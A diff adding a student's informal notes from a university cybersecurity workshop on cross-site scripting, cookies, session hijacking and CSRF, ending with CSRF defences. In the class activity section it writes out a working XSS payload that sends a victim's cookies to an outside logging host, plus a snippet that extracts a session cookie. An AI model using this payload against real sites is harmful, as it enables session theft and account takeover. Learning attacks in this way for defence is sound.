@@ -1,0 +1,84 @@
+XSS: cross-site scripting
+ACM Cyber Workshops #3
+
+-can be used to get user cookies'
+
+-injecting arbitrary JS code into web applications; treated by the broswer as if it is a script used by the website (even if it is not)
+
+-reflective XSS --> malicious JS code is sent through HTTP request to server
+	-server puts code into web page
+	-browser runs it
+		-can be seen in URL; many browsers can therefore see bad code in the URL and therefore auto-block reflective XSS
+
+-persistent XSS --> malicious JS code is sent through HTTP request to server
+	-server puts code into database
+	-server loads from database code into website
+	-neither user nor browsers can tell persistent XSS from genuine code (as behind the scenes)
+
+-what are in cookies
+	-session ID and more is stored in user's cookies
+
+-HTTP --> stateless
+	-request followed up with response; server could not, without cookies, know whether HTTP request is sent by the same person
+		-simplies server programming; not caring who is accessing; info is the same (cookies are used as "tokens" to identify who is requestor)
+
+-with cookies:
+	-token (unique identifier) is sent, session ID is extracted
+
+-cookies are persisted by the browser on each request
+	-therefore JS can actually access these cookies
+		-therefore malicious JS steal 
+
+-process:
+	-browser sends GET request to server
+		-server checks if request has a cookie
+			-if not, sends log-in pages
+			-
+	-server sends: Set-Cookie: _______ to user's computer
+	-next time the user's computer sents an HTTP request to server, it will sent that cookie to the server
+		-used as unique identifier
+
+-how to access cookies:
+	-MEMORY/STORAGE/APPLICATIONS tab (Google Chrome browser is under "Application" tab)
+
+-Session Hijacking: tl;dr: log in as someone else, after stealing their cookies/session ID
+	-therefore if you can recieve someone's session ID in the form of a cookie, you can access a website and the server will believe it is that person
+	-SOMEONE WEBSITES ALLOW FOR EXPIRATION "DATE" on cookies
+		-cookies with "Session" for expiration "date" is based on when you exit your browser
+	-sloppy coding on websites allow for cookies to be stolen
+
+-developer tools --> storage --> cookies --> can see for which one is your session ID
+	-code to recieve cookie in demo --> document.cookie.split('; ').filter(t => t.startsWith('MoodleSession='))[0]
+
+
+
+
+
+-cookies
+	-identifying user
+	-convenience
+
+-	
+	-asb.net framwork --> appened '/elmah/' to URL of hack-yourself-first.com; built in as a way for developers to have info and such
+		-common mistake for first-time developers to forge
+
+
+-activity:
+	-https://affiliable-forts.000webhostapp.com
+	-register
+	-<script>document.location="https://ruby-app-jaykun.c9users.io/posts/log/"+document.cookie</script> ran on second computer
+		-logged cookies
+	-when stupid boi accesses "my records" page from logged-on session, cookies are sent with stupid user's 
+
+
+-CSRF --> cross-site request forgery
+	-don't need to know session ID
+		-essentially just sent HTTP request on behalf of the person you are trying to hack
+	-cookies are persisted on each request
+		-trick someone to click on a link that has a get-request to something else
+
+-Protection from CSRF:
+	-check origin and referer headers (only correct cookies get sent to each website with HTTP request)
+	-anti-csrf tokens
+	-re-auth, OTPS, and captcha
+	-same site cookies
